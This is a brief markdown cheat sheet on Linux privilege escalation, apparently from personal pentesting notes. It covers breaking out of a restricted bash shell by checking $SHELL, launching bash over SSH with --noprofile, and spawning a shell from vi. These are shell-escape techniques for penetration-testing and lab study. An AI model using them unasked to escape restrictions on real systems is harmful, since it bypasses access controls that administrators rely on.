# Linux PrivEsc CheatSheet
[Home](../index.md) | [CheatSheets](../cheatsheets.md) | [About](../about.md)

## Restricted Bash Shell Breakout:

| Command                                   | Purpose                                                                                                         |
| ----------------------------------------- | :--------------------------------------------------------------------------------------------------------------:|
| $SHELL                                    | Determine if you're in a restricted bash environment (/bin/rbash)                                               |
| ssh USER@IP -t "bash --noprofile"         | Can be used to breakout of rbash using SSH if we have a known username and password                             |
| vi
  :set shell=/bin/bash                        Use vi to breakout of the rbash environment, setting the shell to /bin/bash
  :shell
|                                           |                                                                                                                 |
